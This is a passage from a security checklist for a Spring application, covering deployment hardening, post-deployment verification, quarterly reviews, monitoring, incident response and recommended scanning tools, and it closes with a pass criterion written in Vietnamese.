### 20.2. Deployment Checklist
- [ ] Secrets moved to environment variables/vault
- [ ] SSL/TLS enabled for all external connections
- [ ] Database user has minimal privileges
- [ ] Debug mode disabled in production
- [ ] Actuator endpoints secured
- [ ] Security headers configured
- [ ] Logging reviewed (no sensitive data)
- [ ] Monitoring & alerting configured

### 20.3. Post-Deployment Verification
- [ ] Penetration test completed
- [ ] Security scan passed (OWASP ZAP, Burp Suite)
- [ ] No 500 errors in production logs
- [ ] Authentication flow tested
- [ ] Authorization flow tested
- [ ] Error handling verified (401/403 responses)

---

## 21. Continuous Security

### 21.1. Quarterly Reviews
- [ ] Re-run dependency scan
- [ ] Re-run SAST tools
- [ ] Review git commits for security issues
- [ ] Update dependencies to latest stable versions
- [ ] Review and rotate secrets

### 21.2. Security Monitoring
- [ ] Monitor failed authentication attempts (> 10/minute → alert)
- [ ] Monitor 403 Forbidden rate (> 5% → investigate)
- [ ] Monitor database connection errors
- [ ] Monitor external service failures
- [ ] Monitor unusual API usage patterns

### 21.3. Incident Response Plan
- [ ] Security incident detected → isolate affected systems
- [ ] Identify scope of breach
- [ ] Rotate all potentially compromised credentials
- [ ] Patch vulnerability
- [ ] Conduct post-mortem
- [ ] Update security controls

---

## 22. Tools & Resources

### 22.1. Recommended Tools
- **Dependency Scanning**: OWASP Dependency Check, Snyk
- **SAST**: SpotBugs + FindSecBugs, SonarQube, Checkmarx
- **Secret Scanning**: TruffleHog, Gitleaks, git-secrets
- **DAST**: OWASP ZAP, Burp Suite
- **Container Scanning**: Trivy, Clair
- **Runtime Protection**: RASP solutions

### 22.2. Reference Documentation
- [ ] OWASP Top 10: https://owasp.org/Top10/
- [ ] Spring Security Reference: https://docs.spring.io/spring-security/reference/
- [ ] CWE Top 25: https://cwe.mitre.org/top25/
- [ ] NIST Cybersecurity Framework: https://www.nist.gov/cyberframework

---

**PASS CRITERIA**: Tất cả items trong P0 (CRITICAL) và P1 (HIGH) phải được completed trước khi deploy to production.